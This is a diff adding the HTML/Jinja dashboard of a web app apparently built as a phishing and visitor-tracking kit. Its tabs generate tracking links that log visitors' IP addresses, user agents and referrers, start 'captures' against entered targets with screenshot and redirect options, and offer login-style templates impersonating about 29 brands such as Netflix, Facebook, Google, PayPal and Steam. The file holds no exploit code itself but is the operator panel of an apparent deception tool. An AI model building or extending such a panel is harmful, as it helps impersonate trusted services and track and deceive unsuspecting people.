@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ config.site_name }} - Dashboard</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <div class="bg-animation"></div>
+    <div class="grid-overlay"></div>
+
+    <div class="dashboard">
+        <!-- Top Bar -->
+        <div class="top-bar">
+            <div>
+                <div class="logo-text">{{ config.site_name }}</div>
+                <div class="logo-tagline">{{ config.site_tagline }}</div>
+            </div>
+            <div class="user-info">
+                <span class="user-badge {{ 'admin' if is_admin else '' }}">
+                    {{ '👑 Admin' if is_admin else '👤 ' + current_user }}
+                </span>
+                <a href="/logout" class="logout-btn">🚪 Exit</a>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-icon blue">🔗</div>
+                <div class="stat-value" style="color: var(--primary);">{{ user_links|length }}</div>
+                <div class="stat-label">My Links</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon purple">👁️</div>
+                <div class="stat-value" style="color: var(--secondary);">{{ user_links|sum(attribute='clicks') }}</div>
+                <div class="stat-label">Total Clicks</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon pink">📸</div>
+                <div class="stat-value" style="color: var(--accent);">{{ user_captures|length }}</div>
+                <div class="stat-label">Captures</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon green">🌐</div>
+                <div class="stat-value" style="color: var(--success);">{{ user_links|map(attribute='visitors')|map('length')|sum }}</div>
+                <div class="stat-label">Visitors</div>
+            </div>
+            {% if is_admin %}
+            <div class="stat-card">
+                <div class="stat-icon orange">👥</div>
+                <div class="stat-value" style="color: #ff6b00;">{{ data.users|length }}</div>
+                <div class="stat-label">Total Users</div>
+            </div>
+            {% endif %}
+        </div>
+
+        <!-- Tabs -->
+        <div class="section">
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('tracking')">📡 Tracking</button>
+                <button class="tab-btn" onclick="switchTab('capture')">📸 Capture</button>
+                <button class="tab-btn" onclick="switchTab('templates')">🎨 Templates</button>
+                {% if is_admin %}
+                <button class="tab-btn" onclick="switchTab('users')">👥 Users</button>
+                {% endif %}
+            </div>
+
+            <!-- TAB 1: LINK TRACKING -->
+            <div class="tab-content active" id="tab-tracking">
+                <div class="card">
+                    <div class="card-title">🚀 Generate Tracking Link</div>
+                    <div class="input-group">
+                        <input type="text" class="input-field" id="trackUrl" placeholder="Enter URL to track (e.g., example.com)">
+                        <button class="btn" onclick="generateTrack()">Generate</button>
+                    </div>
+                    <div class="track-result" id="trackResult">
+                        <div style="color: var(--muted); font-size: 14px;">✅ Tracking link generated!</div>
+                        <div class="track-url" id="trackUrlResult"></div>
+                        <button class="btn" style="margin-top: 10px; width: 100%;" onclick="copyTrackUrl()">📋 Copy Link</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">📊 My Tracking Links</div>
+                    <div style="overflow-x: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Target URL</th>
+                                    <th>Clicks</th>
+                                    <th>Visitors</th>
+                                    <th>Created</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="linksTable">
+                                {% for link in user_links %}
+                                <tr id="link-{{ link.id }}">
+                                    <td><span style="color: var(--primary); font-family: monospace;">{{ link.id }}</span></td>
+                                    <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">{{ link.url }}</td>
+                                    <td><span style="color: var(--primary); font-weight: 700;">{{ link.clicks }}</span></td>
+                                    <td>{{ link.visitors|length }}</td>
+                                    <td style="color: var(--muted); font-size: 12px;">{{ link.created_at[:10] }}</td>
+                                    <td>
+                                        <button class="btn btn-sm btn-danger" onclick="deleteLink('{{ link.id }}')">🗑️</button>
+                                    </td>
+                                </tr>
+                                {% else %}
+                                <tr>
+                                    <td colspan="6" style="text-align: center; color: var(--muted); padding: 30px;">No tracking links yet. Generate one above!</td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                {% if user_links %}
+                <div class="card">
+                    <div class="card-title">📋 Visitor Logs</div>
+                    <div style="overflow-x: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>Link ID</th>
+                                    <th>IP Address</th>
+                                    <th>User Agent</th>
+                                    <th>Time</th>
+                                    <th>Referrer</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for link in user_links %}
+                                    {% for visitor in link.visitors %}
+                                    <tr>
+                                        <td><span style="color: var(--primary); font-family: monospace;">{{ link.id }}</span></td>
+                                        <td>{{ visitor.ip }}</td>
+                                        <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; font-size: 12px;">{{ visitor.user_agent[:50] }}...</td>
+                                        <td style="color: var(--muted); font-size: 12px;">{{ visitor.time[:16] }}</td>
+                                        <td style="color: var(--muted); font-size: 12px;">{{ visitor.referrer[:30] }}</td>
+                                    </tr>
+                                    {% endfor %}
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                {% endif %}
+            </div>
+
+            <!-- TAB 2: CAPTURE SYSTEM -->
+            <div class="tab-content" id="tab-capture">
+                <div class="card">
+                    <div class="card-title">🎯 Start New Capture</div>
+                    <div class="input-group">
+                        <input type="text" class="input-field" id="captureTarget" placeholder="Enter target URL or identifier">
+                        <select class="input-field" id="captureType" style="max-width: 150px;">
+                            <option value="screenshot">📸 Screenshot</option>
+                            <option value="info">ℹ️ Info</option>
+                            <option value="redirect">🔄 Redirect</option>
+                        </select>
+                        <button class="btn btn-danger" onclick="startCapture()">🎯 Start</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">📸 My Captures</div>
+                    <div style="overflow-x: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Target</th>
+                                    <th>Type</th>
+                                    <th>Status</th>
+                                    <th>Created</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="capturesTable">
+                                {% for cap in user_captures %}
+                                <tr id="cap-{{ cap.id }}">
+                                    <td><span style="color: var(--accent); font-family: monospace;">{{ cap.id }}</span></td>
+                                    <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">{{ cap.target }}</td>
+                                    <td><span class="badge badge-pending">{{ cap.type }}</span></td>
+                                    <td><span class="badge badge-success">{{ cap.status }}</span></td>
+                                    <td style="color: var(--muted); font-size: 12px;">{{ cap.created_at[:10] }}</td>
+                                    <td>
+                                        <button class="btn btn-sm btn-danger" onclick="deleteCapture('{{ cap.id }}')">🗑️</button>
+                                    </td>
+                                </tr>
+                                {% else %}
+                                <tr>
+                                    <td colspan="6" style="text-align: center; color: var(--muted); padding: 30px;">No captures yet. Start one above!</td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 3: TEMPLATES -->
+            <div class="tab-content" id="tab-templates">
+                <div class="card">
+                    <div class="card-title">🎨 Choose Template</div>
+                    <div class="template-grid">
+                        {% set templates = [
+                            ("netflix", "🎬", "#e50914"), ("instagram", "📷", "#e4405f"),
+                            ("facebook", "👤", "#1877f2"), ("google", "🔍", "#4285f4"),
+                            ("tiktok", "🎵", "#000000"), ("pubg", "🎮", "#f2a900"),
+                            ("whatsapp", "💬", "#25d366"), ("snapchat", "👻", "#fffc00"),
+                            ("twitter", "🐦", "#1da1f2"), ("youtube", "▶️", "#ff0000"),
+                            ("spotify", "🎧", "#1db954"), ("discord", "💬", "#5865f2"),
+                            ("steam", "🎮", "#1b2838"), ("epicgames", "🎮", "#ffffff"),
+                            ("roblox", "🟥", "#000000"), ("minecraft", "⛏️", "#5d8c3a"),
+                            ("fortnite", "🎮", "#9d4dbb"), ("callofduty", "🔫", "#000000"),
+                            ("freefire", "🔥", "#ff6b00"), ("amongus", "🚀", "#ff0000"),
+                            ("paypal", "💳", "#003087"), ("amazon", "📦", "#ff9900"),
+                            ("flipkart", "🛒", "#2874f0"), ("daraz", "🛍️", "#f57224"),
+                            ("zoom", "📹", "#2d8cff"), ("telegram", "✈️", "#0088cc"),
+                            ("signal", "📡", "#3a76f0"), ("linkedin", "💼", "#0a66c2"),
+                            ("github", "🐙", "#24292e")
+                        ] %}
+                        {% for name, icon, color in templates %}
+                        <a href="/template/{{ name }}" class="template-card" target="_blank">
+                            <div class="template-icon" style="background: {{ color }}20; color: {{ color }};">{{ icon }}</div>
+                            <div class="template-name">{{ name }}</div>
+                        </a>
+                        {% endfor %}
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 4: USERS (Admin Only) -->
+            {% if is_admin %}
+            <div class="tab-content" id="tab-users">
+                <div class="card">
+                    <div class="card-title">👥 All Users</div>
+                    <div style="overflow-x: auto;">
+                        <table class="data-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Username</th>
+                                    <th>Email</th>
+                                    <th>Role</th>
+                                    <th>Joined</th>
+                                    <th>Links</th>
+                                    <th>Captures</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for user in data.users %}
+                                <tr>
+                                    <td><span style="color: var(--primary); font-family: monospace;">{{ user.id }}</span></td>
+                                    <td>{{ user.username }}</td>
+                                    <td>{{ user.email }}</td>
+                                    <td><span class="badge badge-success">{{ user.role }}</span></td>
+                                    <td style="color: var(--muted); font-size: 12px;">{{ user.created_at[:10] }}</td>
+                                    <td>{{ data.links|selectattr('created_by', 'equalto', user.username)|list|length }}</td>
+                                    <td>{{ data.captures|selectattr('created_by', 'equalto', user.username)|list|length }}</td>
+                                </tr>
+                                {% else %}
+                                <tr>
+                                    <td colspan="7" style="text-align: center; color: var(--muted); padding: 30px;">No users yet</td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">📊 Global Stats</div>
+                    <div class="stats-grid" style="padding: 0;">
+                        <div class="stat-card">
+                            <div class="stat-icon blue">🔗</div>
+                            <div class="stat-value" style="color: var(--primary);">{{ data.links|length }}</div>
+                            <div class="stat-label">All Links</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon purple">👁️</div>
+                            <div class="stat-value" style="color: var(--secondary);">{{ data.links|sum(attribute='clicks') }}</div>
+                            <div class="stat-label">All Clicks</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon pink">📸</div>
+                            <div class="stat-value" style="color: var(--accent);">{{ data.captures|length }}</div>
+                            <div class="stat-label">All Captures</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon green">🌐</div>
+                            <div class="stat-value" style="color: var(--success);">{{ data.links|map(attribute='visitors')|map('length')|sum }}</div>
+                            <div class="stat-label">All Visitors</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <script>
+        // Tab Switching
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+
+            event.target.classList.add('active');
+            document.getElementById('tab-' + tabName).classList.add('active');
+        }
+
+        // Generate Tracking Link
+        async function generateTrack() {
+            const url = document.getElementById('trackUrl').value;
+            if (!url) return alert('Please enter a URL!');
+
+            const btn = event.target;
+            btn.textContent = '⏳ Processing...';
+
+            try {
+                const res = await fetch('/api/track', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({url: url})
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    document.getElementById('trackUrlResult').textContent = data.track_url;
+                    document.getElementById('trackResult').classList.add('show');
+                    setTimeout(() => location.reload(), 2000);
+                }
+            } catch(e) {
+                alert('Error generating tracking link!');
+            }
+
+            btn.textContent = 'Generate';
+        }
+
+        function copyTrackUrl() {
+            const url = document.getElementById('trackUrlResult').textContent;
+            navigator.clipboard.writeText(url);
+            alert('Link copied to clipboard!');
+        }
+
+        // Start Capture
+        async function startCapture() {
+            const target = document.getElementById('captureTarget').value;
+            const type = document.getElementById('captureType').value;
+            if (!target) return alert('Enter a target!');
+
+            const btn = event.target;
+            btn.textContent = '⏳ Starting...';
+
+            try {
+                const res = await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({target: target, type: type})
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    alert('Capture started! ID: ' + data.capture_id);
+                    setTimeout(() => location.reload(), 1000);
+                }
+            } catch(e) {
+                alert('Capture failed!');
+            }
+
+            btn.textContent = '🎯 Start';
+        }
+
+        // Delete Link
+        async function deleteLink(id) {
+            if (!confirm('Delete this link?')) return;
+
+            try {
+                const res = await fetch('/api/delete_link/' + id, {method: 'DELETE'});
+                const data = await res.json();
+
+                if (data.success) {
+                    document.getElementById('link-' + id).remove();
+                }
+            } catch(e) {
+                alert('Error deleting link!');
+            }
+        }
+
+        // Delete Capture
+        async function deleteCapture(id) {
+            if (!confirm('Delete this capture?')) return;
+
+            try {
+                const res = await fetch('/api/delete_capture/' + id, {method: 'DELETE'});
+                const data = await res.json();
+
+                if (data.success) {
+                    document.getElementById('cap-' + id).remove();
+                }
+            } catch(e) {
+                alert('Error deleting capture!');
+            }
+        }
+    </script>
+</body>
+</html>
